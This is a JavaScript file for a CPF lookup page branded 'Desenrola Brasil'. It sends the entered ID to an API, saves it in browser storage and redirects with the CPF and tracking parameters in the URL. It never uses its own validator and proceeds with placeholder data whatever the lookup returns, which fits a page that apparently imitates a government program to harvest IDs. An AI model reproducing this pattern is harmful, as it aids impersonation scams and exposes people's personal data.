// Lógica da tela de Consulta de CPF - Desenrola Brasil

document.addEventListener('DOMContentLoaded', () => {
  const cpfInput = document.getElementById('cpfInput');
  const cpfError = document.getElementById('cpfError');
  const btnContinuar = document.getElementById('btnContinuar');
  const btnText = document.getElementById('btnText');
  const btnContrast = document.getElementById('btn-contrast');
  const btnReload = document.getElementById('btn-reload');

  // Sem máscara de pontuação no CPF
  if (cpfInput) {
    cpfInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11);

      // Limpar erro ao digitar
      if (cpfError) cpfError.style.display = 'none';
      cpfInput.classList.remove('error');
    });

    // Submeter ao pressionar Enter
    cpfInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitCPF();
      }
    });

    // Foco automático suave se não for dispositivo móvel com scroll
    if (window.innerWidth > 600) {
      cpfInput.focus();
    }
  }

  // Botões do cabeçalho
  if (btnContrast) {
    btnContrast.addEventListener('click', () => {
      document.body.classList.toggle('high-contrast');
    });
  }

  if (btnReload) {
    btnReload.addEventListener('click', () => {
      window.location.reload();
    });
  }
});

// Validação dos dígitos verificadores do CPF
function isValidCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(cpf.charAt(i), 10) * (10 - i);
  }
  let rev = 11 - (sum % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(9), 10)) return false;

  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(cpf.charAt(i), 10) * (11 - i);
  }
  rev = 11 - (sum % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(10), 10)) return false;

  return true;
}

async function submitCPF() {
  const cpfInput = document.getElementById('cpfInput');
  const cpfError = document.getElementById('cpfError');
  const btn = document.getElementById('btnContinuar');
  const btnText = document.getElementById('btnText');

  if (!cpfInput) return;

  const raw = cpfInput.value.replace(/\D/g, '');

  if (raw.length !== 11) {
    cpfInput.classList.add('error');
    if (cpfError) {
      cpfError.textContent = 'CPF deve ter 11 dígitos. Verifique e tente novamente.';
      cpfError.style.display = 'block';
    }
    return;
  }

  // Estado de carregamento
  btn.disabled = true;
  if (btnText) btnText.textContent = 'Aguarde';
  if (cpfError) cpfError.style.display = 'none';
  cpfInput.classList.remove('error');

  try {
    const response = await fetch('/api/consultar-cpf?cpf=' + raw);
    const data = await response.json();

    // Se a API externa retornar dados, armazena; caso contrário, prossegue com dados padrão
    const finalData = (response.ok && data) ? data : { documento: raw, nome: 'Beneficiário' };

    // Sucesso: armazena dados no storage seguro do navegador
    try {
      localStorage.setItem('desenrola_cpf', raw);
      sessionStorage.setItem('desenrola_user', JSON.stringify(finalData));
      localStorage.setItem('desenrola_user', JSON.stringify(finalData));
    } catch (e) {}

    // Preserva integralmente parâmetros de URL (UTMs, tracking) e mantém o CPF da consulta na URL
    if (typeof redirectPreservingParams === 'function') {
      redirectPreservingParams('atendimento.html', { cpf: raw });
    } else {
      const dest = new URL('atendimento.html', window.location.href);
      dest.searchParams.set('cpf', raw);
      new URLSearchParams(window.location.search).forEach((v, k) => {
        if (!dest.searchParams.has(k)) dest.searchParams.append(k, v);
      });
      window.location.href = dest.toString();
    }

  } catch (err) {
    console.error('Erro na requisição /api/consultar-cpf:', err);
    try {
      localStorage.setItem('desenrola_cpf', raw);
    } catch (e) {}
    if (typeof redirectPreservingParams === 'function') {
      redirectPreservingParams('atendimento.html', { cpf: raw });
    } else {
      const dest = new URL('atendimento.html', window.location.href);
      dest.searchParams.set('cpf', raw);
      new URLSearchParams(window.location.search).forEach((v, k) => {
        if (!dest.searchParams.has(k)) dest.searchParams.append(k, v);
      });
      window.location.href = dest.toString();
    }
  }
}
